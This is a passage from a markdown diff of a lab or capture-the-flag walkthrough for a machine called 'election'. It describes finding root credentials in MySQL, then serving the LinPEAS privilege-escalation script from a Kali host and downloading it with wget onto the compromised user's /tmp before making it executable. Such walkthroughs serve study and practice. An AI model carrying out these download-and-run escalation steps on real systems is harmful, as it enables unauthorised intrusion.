@@ -261,3 +261,77 @@ After digging around into the custom "election" database, I've managed to find t
 
 ![](attachments/Pasted%20image%2020250213210256.png)
 
+I've also managed to find the root user's credentials within the built-in MySQL DB.
+
+![](attachments/Pasted%20image%2020250213210807.png)
+
+Now, in order to escalate our privileges from Love to gain full access into root, I've decided to proceed with launching "Linpeas" script.
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ peass -h    
+
+> peass ~ Privilege Escalation Awesome Scripts SUITE
+
+/usr/share/peass/
+├── linpeas
+│   ├── linpeas_darwin_amd64
+│   ├── linpeas_darwin_arm64
+│   ├── linpeas_fat.sh
+│   ├── linpeas_linux_386
+│   ├── linpeas_linux_amd64
+│   ├── linpeas_linux_arm
+│   ├── linpeas_linux_arm64
+│   ├── linpeas.sh
+│   └── linpeas_small.sh
+└── winpeas
+    ├── winPEASany.exe
+    ├── winPEASany_ofs.exe
+    ├── winPEAS.bat
+    ├── winPEASx64.exe
+    ├── winPEASx64_ofs.exe
+    ├── winPEASx86.exe
+    └── winPEASx86_ofs.exe
+┌──(kali㉿kali)-[/usr/share/peass]
+└─$ cd linpeas     
+                                                                                                                        
+┌──(kali㉿kali)-[/usr/share/peass/linpeas]
+└─$ ls
+linpeas_darwin_amd64  linpeas_fat.sh     linpeas_linux_amd64  linpeas_linux_arm64  linpeas_small.sh
+linpeas_darwin_arm64  linpeas_linux_386  linpeas_linux_arm    linpeas.sh
+                                                                                                                        
+┌──(kali㉿kali)-[/usr/share/peass/linpeas]
+└─$ python -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
+```
+
+Delivering the Linpeas script to the target. 
+
+```
+love@election:/tmp$ wget http://192.168.45.213:8000/linpeas.sh
+--2025-02-14 02:36:01--  http://192.168.45.213:8000/linpeas.sh
+Connecting to 192.168.45.213:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 830426 (811K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh                    100%[=================================================>] 810.96K  1.06MB/s    in 0.7s    
+
+2025-02-14 02:36:02 (1.06 MB/s) - ‘linpeas.sh’ saved [830426/830426]
+
+love@election:/tmp$ ls -la linpeas.sh 
+-rw-rw-r-- 1 love love 830426 Jan 13 17:01 linpeas.sh
+love@election:/tmp$ 
+
+```
+
+Making the script executable. 
+
+```
+love@election:/tmp$ chmod +x linpeas.sh 
+love@election:/tmp$ ls -la linpeas.sh 
+-rwxrwxr-x 1 love love 830426 Jan 13 17:01 linpeas.sh
+love@election:/tmp$ 
+```
+
